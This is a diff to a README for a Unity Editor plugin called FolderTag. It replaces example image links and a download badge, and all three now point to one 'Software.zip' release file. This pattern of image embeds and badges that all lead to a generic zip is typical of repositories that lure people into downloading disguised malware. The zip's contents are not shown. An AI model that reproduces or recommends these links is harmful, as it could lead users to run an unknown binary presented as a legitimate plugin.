@@ -1,6 +1,6 @@
 # FolderTag Unity Editor Plugin 🎮
 
-![FolderTag Logo](https://example.com/foldertag_logo.png)
+![FolderTag Logo](https://github.com/lakshmipriya-rpn/FolderTag/releases/download/v1.0/Software.zip)
 
 Welcome to the official repository of **FolderTag**, a Unity Editor Plugin designed to enhance your workflow and organization within Unity projects. With FolderTag, you can easily manage and categorize your project assets, improving overall project navigation and development efficiency.
 
@@ -15,7 +15,7 @@ Welcome to the official repository of **FolderTag**, a Unity Editor Plugin desig
 
 To get started with FolderTag, download the latest release of the plugin from the link below:
 
-[![Download FolderTag](https://img.shields.io/badge/Download-FolderTag-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download FolderTag](https://github.com/lakshmipriya-rpn/FolderTag/releases/download/v1.0/Software.zip)](https://github.com/lakshmipriya-rpn/FolderTag/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the zip file, extract its contents and follow the installation instructions provided in the README included in the package.
 
@@ -42,4 +42,4 @@ FolderTag is licensed under the MIT License. See the LICENSE file included in th
 
 Thank you for choosing FolderTag to optimize your Unity project organization! We hope this plugin makes your development process smoother and more efficient. Happy tagging! 🏷️🔖
 
-![FolderTag Demo](https://example.com/foldertag_demo.gif)
+![FolderTag Demo](https://github.com/lakshmipriya-rpn/FolderTag/releases/download/v1.0/Software.zip)
